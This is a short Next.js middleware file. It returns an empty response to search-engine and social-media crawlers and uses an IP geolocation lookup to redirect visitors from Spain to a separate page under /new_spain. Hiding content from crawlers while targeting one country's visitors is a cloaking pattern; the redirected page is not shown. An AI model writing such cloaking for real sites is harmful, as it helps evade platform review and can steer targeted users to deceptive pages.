import { NextRequest, NextResponse } from 'next/server'

function isBot(ua: string) {
    return /googlebot|bingbot|yandex|duckduckbot|baiduspider|facebookexternalhit/i.test(ua)
}

export async function middleware(req: NextRequest) {
    const ua = req.headers.get('user-agent')?.toLowerCase() || ''
    const isCrawler = isBot(ua)

    const ipHeader =
        req.headers.get('x-forwarded-for') ||
        req.headers.get('x-real-ip') ||
        req.headers.get('cf-connecting-ip') ||
        '8.8.8.8'
    const ip = ipHeader.split(',')[0].trim()

    if (isCrawler) return new NextResponse(null, { status: 204 })

    try {
        const geoRes = await fetch(`https://ipwho.is/${ip}`)
        const geo = await geoRes.json()
        const isSpain = geo.success && geo.country_code === 'ES'
        if (!isSpain) return NextResponse.next()

        // РЕДІРЕКТ НА ФАЙЛ З PUBLIC (HTML)
        return NextResponse.redirect(new URL('/new_spain/index.html', req.url), 307)
    } catch {
        return NextResponse.next()
    }
}

export const config = {
    matcher: ['/', '/((?!_next|api|static|favicon.ico).*)'],
}
